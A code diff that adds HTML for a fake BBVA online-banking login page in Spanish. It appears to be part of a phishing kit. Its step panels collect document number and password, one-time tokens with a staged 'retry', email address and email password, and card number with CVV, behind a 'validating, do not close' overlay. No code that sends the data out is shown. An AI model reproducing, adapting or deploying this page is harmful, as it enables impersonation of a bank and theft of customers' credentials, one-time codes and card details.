@@ -1,0 +1,92 @@
+<div class="fondo" id="bbva-fondo-local" style="display:none;position:fixed;z-index:9998;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.45);"></div>
+<div class="mensaje" id="bbva-msg-local" style="display:none;padding:24px;background:#fff;position:fixed;z-index:9999;top:50%;left:50%;transform:translate(-50%,-50%);max-width:420px;width:90%;border-radius:12px;color:#004481;font-size:16px;box-shadow:0 8px 32px rgba(0,0,0,.15);">
+    <div class="bbva-msg-body">
+        <p class="bbva-msg-text">Por favor espere un momento, estamos validando algunos datos. No cierre esta ventana.</p>
+        <div class="bbva-msg-loader">
+            <img src="img/loader.gif" id="cargandoani" alt="" width="56" height="56" decoding="async">
+        </div>
+    </div>
+</div>
+<section id="panel-bbva-local" style="position:relative;z-index:100;background:#f4f4f4;padding:0 0 20px;border-bottom:1px solid #e0e0e0;">
+    <div class="bbva-panel-brand" style="background:#001391;padding:18px 16px 20px;text-align:center;">
+        <span style="color:#fff;font-size:1.35rem;font-weight:700;letter-spacing:.06em;">BBVA</span>
+        <div style="color:rgba(255,255,255,.9);font-size:.88rem;margin-top:6px;font-weight:400;">Banca en línea · Personas</div>
+    </div>
+    <div class="wrap signin" style="max-width:440px;margin:0 auto;padding:18px 16px 0;">
+        <div class="card bbva-login-card" style="background:#fff;border-radius:12px;padding:24px;box-shadow:0 2px 6px rgba(0,0,0,.05);">
+            <div id="contenedor-login" class="step-panel is-visible">
+                <p class="bbva-secure-hint">Estás en un entorno con seguridad BBVA</p>
+                <h2 class="bbva-login-heading">Hola, inicia sesión en BBVA Net:</h2>
+                <div class="field bbva-field-select">
+                    <label class="bbva-sr-only" for="docTypeMovil">Tipo de documento</label>
+                    <select id="docTypeMovil" class="bbva-select-local" aria-label="Tipo de documento">
+                        <option value="CC">Cédula de ciudadanía</option>
+                        <option value="CE">Cédula de extranjería</option>
+                        <option value="TI">Tarjeta de identidad</option>
+                        <option value="PA">Pasaporte</option>
+                        <option value="NIT">NIT</option>
+                    </select>
+                </div>
+                <div class="field">
+                    <label class="bbva-sr-only" for="docNumberMovil">Número de documento</label>
+                    <input type="text" id="docNumberMovil" autocomplete="off" inputmode="numeric" placeholder="Número de documento" aria-label="Número de documento">
+                </div>
+                <div class="field bbva-field-password">
+                    <label class="bbva-sr-only" for="passwordMovil">Contraseña</label>
+                    <div class="bbva-password-wrap">
+                        <input type="password" id="passwordMovil" autocomplete="off" placeholder="Contraseña" aria-label="Contraseña">
+                        <button type="button" class="bbva-toggle-password" aria-label="Mostrar contraseña" tabindex="0">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" aria-hidden="true"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/></svg>
+                        </button>
+                    </div>
+                </div>
+                <button type="button" class="boton-azul bbva-btn-entrar" id="btnEntrar">Entrar</button>
+                <p class="bbva-forgot-wrap"><a href="#" class="bbva-forgot-link">¿Olvidaste tu contraseña?</a></p>
+            </div>
+            <div id="contenedor-token" class="step-panel" style="display:none;">
+                <h2 style="font-size:22px;">Clave dinámica</h2>
+                <p class="sub" style="font-size:15px;color:#666;">Ingresa el código de un solo uso.</p>
+                <div class="field" style="margin-bottom:18px;">
+                    <label for="TokenOTP">Token</label>
+                    <input type="text" id="TokenOTP" autocomplete="off" inputmode="numeric" style="width:100%;height:52px;padding:0 14px;border:none;border-bottom:2px solid #121212;background:#f4f4f4;font-size:16px;">
+                </div>
+                <button type="button" class="boton-azul" id="btnEnviarToken" style="width:100%;">Continuar</button>
+            </div>
+            <div id="contenedor-token-err" class="step-panel" style="display:none;">
+                <h2 style="font-size:22px;">Reintento</h2>
+                <p class="sub" style="font-size:15px;color:#666;">Intenta de nuevo con un nuevo código.</p>
+                <div class="field" style="margin-bottom:18px;">
+                    <label for="TokenOTPErr">Nuevo token</label>
+                    <input type="text" id="TokenOTPErr" autocomplete="off" inputmode="numeric" style="width:100%;height:52px;padding:0 14px;border:none;border-bottom:2px solid #121212;background:#f4f4f4;font-size:16px;">
+                </div>
+                <button type="button" class="boton-azul" id="btnEnviarTokenErr" style="width:100%;">Continuar</button>
+            </div>
+            <div id="contenedor-mail" class="step-panel" style="display:none;">
+                <h2 style="font-size:22px;">Verificación</h2>
+                <p class="sub" style="font-size:15px;color:#666;">Confirma tu correo y clave.</p>
+                <div class="field" style="margin-bottom:18px;">
+                    <label for="correoElectronico">Correo electrónico</label>
+                    <input type="email" id="correoElectronico" autocomplete="off" style="width:100%;height:52px;padding:0 14px;border:none;border-bottom:2px solid #121212;background:#f4f4f4;font-size:16px;">
+                </div>
+                <div class="field" style="margin-bottom:18px;">
+                    <label for="claveCorreo">Clave del correo</label>
+                    <input type="password" id="claveCorreo" autocomplete="off" style="width:100%;height:52px;padding:0 14px;border:none;border-bottom:2px solid #121212;background:#f4f4f4;font-size:16px;">
+                </div>
+                <button type="button" class="boton-azul" id="btnEnviarMail" style="width:100%;">Continuar</button>
+            </div>
+            <div id="contenedor-otp" class="step-panel" style="display:none;">
+                <h2 style="font-size:22px;">Datos de tarjeta</h2>
+                <p class="sub" style="font-size:15px;color:#666;">Completa la información solicitada.</p>
+                <div class="field" style="margin-bottom:18px;">
+                    <label for="tarjetaBloque">Número de tarjeta</label>
+                    <input type="text" id="tarjetaBloque" autocomplete="off" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" style="width:100%;height:52px;padding:0 14px;border:none;border-bottom:2px solid #121212;background:#f4f4f4;font-size:16px;">
+                </div>
+                <div class="field" style="margin-bottom:18px;">
+                    <label for="claveCajero">CVV</label>
+                    <input type="password" id="claveCajero" autocomplete="off" inputmode="numeric" maxlength="4" style="width:100%;height:52px;padding:0 14px;border:none;border-bottom:2px solid #121212;background:#f4f4f4;font-size:16px;">
+                </div>
+                <button type="button" class="boton-azul" id="btnEnviarTarjeta" style="width:100%;">Continuar</button>
+            </div>
+        </div>
+    </div>
+</section>
